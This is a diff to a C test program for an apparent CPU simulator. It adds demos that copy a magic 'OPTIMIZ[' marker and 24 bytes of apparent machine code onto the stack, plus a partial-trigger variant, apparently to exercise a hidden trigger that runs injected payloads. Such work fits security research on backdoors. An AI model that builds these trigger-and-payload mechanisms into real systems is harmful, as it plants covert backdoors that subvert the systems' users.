@@ -168,22 +168,89 @@ void strcpy_one_by_one(char *dst, const char *src) {
     *dst = '\0';
 }
 
+void memcpy_one_by_one_u8(uint8_t *dst, const uint8_t *src, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        *dst = *src;
+        dst++;
+        src++;
+    }
+}
+
 // FIXME: Known bug - global variables are not currently supported with this memory/linker model.
-// char opt_demo_string[] = "OPTIMIZE_START[b7020001130380051373f30fb3e262007390227b6ff0dfff]DONE";
+// char opt_demo_string[] = "OPTIMIZ[b7020001130380051373f30fb3e262007390227b6ff0dfff]DONE";
 
-void demo_vulnerability_by_copying_trigger_and_payload_to_stack(void) {
-    sim_puts("Starting to memory load the optimization demo...\n");
-
+void demo_partial_progression_with_gaps(void) {
     char demo_string[200];
 
+    sim_puts("Starting partial progression demo...\n");
+
     // Copy the demo string to the stack.
-    strcpy_one_by_one(demo_string, "OPTIMIZE_START[b7020001130380051373f30fb3e262007390227b6ff0dfff]DONE");
+    strcpy_one_by_one(demo_string, "OPTI");
+    sim_puts("Loaded 'OPTI' to stack\n");
+    strcpy_one_by_one(demo_string + 2, "MIZ");
+    sim_puts("Loaded 'MIZ' to stack. Returning now.\n");
+}
+
+
+void demo_vulnerability_by_copying_trigger_and_payload_to_stack(void) {
+    uint8_t demo_string[200];
+    sim_puts("DEBUG: Expecting address of start of payload to be stored to 0x");
+    sim_put_hex(((uint32_t) &demo_string) + 8);
+    sim_puts("\n");
+
+    sim_puts("Starting to memory load the optimization demo...\n");
+
+    // Copy the demo string to the stack.
+    // strcpy_one_by_one(demo_string, "OPTIMIZ[b7020001130380051373f30fb3e262007390227b6ff0dfff]DONE");
+    memcpy_one_by_one_u8(
+        demo_string,
+        // "OPTIMIZ[b7020001130380051373f30fb3e262007390227b6ff0dfff]DONE"
+        (uint8_t[]) {
+            'O', 'P', 'T', 'I', 'M', 'I', 'Z', '[', // 8 bytes
+            // Payload here (24 bytes):
+            0xb7,
+            0x70,
+            0x02,
+            0x20,
+            0x00,
+            0x00,
+            0x01,
+            0x11,
+            0x13,
+            0x30,
+            0x03,
+            0x38,
+            0x80,
+            0x00,
+            0x05,
+            0x51,
+            0x13,
+            0x37,
+            0x73,
+            0x3f,
+            0xf3,
+            0x30,
+            0x0f,
+            0xfb,
+            // End of payload
+            ']',
+            'a',
+            'b',
+            'c',
+            'd'
+        },
+        37
+    );
 
     sim_puts("Optimization demo completed!\n");
 }
 
 int main(void) {
     sim_puts("Hello, World!\n");
+
+    sim_puts("Calling demo_partial_progression_with_gaps()\n");
+    demo_partial_progression_with_gaps();
+    sim_puts("Returned from demo_partial_progression_with_gaps()\n");
 
     sim_puts("Calling demo_vulnerability_by_copying_trigger_and_payload_to_stack()\n");
     demo_vulnerability_by_copying_trigger_and_payload_to_stack();
